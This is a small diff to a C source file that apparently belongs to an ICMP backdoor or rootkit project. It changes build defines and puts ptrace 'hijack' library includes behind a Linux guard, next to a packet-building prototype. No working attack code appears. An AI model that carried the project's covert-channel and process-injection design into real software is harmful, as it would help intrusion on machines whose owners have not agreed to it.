@@ -1,8 +1,5 @@
 #include "rooty.h"
 
-#define FreeBSD
-#define amd64
-
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/mman.h>
@@ -12,9 +9,12 @@
 #include <netinet/in.h>
 #include <pcap.h>
 #include <netdb.h>
-#include <hijack.h>
-#include <hijack_func.h>
-#include <hijack_ptrace.h>
+
+#ifdef Linux
+   #include <hijack.h>
+   #include <hijack_func.h>
+   #include <hijack_ptrace.h>
+#endif
 
 // Build response packets for sending
 int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, uint8_t *data, uint32_t size);
